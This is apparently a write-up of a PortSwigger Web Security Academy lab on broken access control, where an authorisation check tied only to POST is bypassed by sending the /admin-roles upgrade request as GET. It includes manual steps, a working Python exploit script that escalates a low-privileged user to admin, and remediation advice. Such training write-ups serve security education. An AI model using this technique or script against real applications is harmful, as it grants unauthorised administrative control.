# Method-Based Access Control Bypass (POST to GET) — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-07-30

## The Problem

The endpoint responsible for promoting a user to admin (`/admin-roles`) only performed its authorization check when the request method was `POST`. The application's logic essentially looked like:

```
if request.method == "POST":
    if user.role != "admin":
        return 403 Forbidden
    # perform the role upgrade
```

Since the authorization check was written *inside* the `POST`-only branch, sending the exact same request using the `GET` method skipped the check entirely — the server executed the privileged action regardless of the requester's actual role.

## Discovery / Exploitation

1. Log in as an admin and observe the legitimate request used to promote a user (a `POST` request to `/admin-roles` with parameters like `username` and `action=upgrade`)
2. Log out, then log in again as a normal, low-privileged user (`wiener`)
3. Replay the same action, but as a `GET` request instead of `POST`, using the normal user's own session:
   ```
   GET /admin-roles?username=wiener&action=upgrade
   ```
4. The server processes the request and upgrades the user's own role to admin — with no authorization check performed at all, since that check only existed in the `POST` code path

## Impact

Any authenticated user can escalate their own privileges to admin simply by changing the HTTP method of a legitimate admin request from `POST` to `GET`. This is a critical vertical privilege escalation vulnerability, and it's especially dangerous because the underlying endpoint and parameters are completely legitimate — only the request method differs.

## Proof of Concept (Python)

This script logs in as the low-privileged user, then sends the role-upgrade request as `GET` instead of `POST` to bypass the authorization check tied only to the `POST` method.

```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def promote_to_admin(s, url):
    login_url = url + "/login"
    data = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, verify=False, proxies=proxies, data=data)
    res = r.text

    if "log out" in res:
        print("(+) successfully logged in")

        admin_role_url = url + "/admin-roles?username=wiener&action=upgrade"
        r = s.get(admin_role_url, proxies=proxies, verify=False)
        res = r.text

        if "admin panel" in res:
            print("(+) successfully promoted the user to administrator")
        else:
            print("(-) could not promote the user to administrator")
            sys.exit(-1)
    else:
        print("(-) failed to log in")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    promote_to_admin(s, url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Logs in as the low-privileged user (`wiener`) using a session so cookies persist
2. Confirms login success by checking for "log out" in the response
3. Sends the role-upgrade request as `GET` (instead of the legitimate `POST`) directly with the user's own session cookie
4. Checks the response for "admin panel" to confirm the privilege escalation succeeded

## Remediation

Authorization checks must apply uniformly to an endpoint regardless of the HTTP method used to reach it. The check should be the first thing evaluated for the route — before branching on method — so no method (GET, POST, PUT, etc.) can accidentally skip it. Frameworks that route by both path and method are especially prone to this mistake if authorization is written per-method instead of per-route.
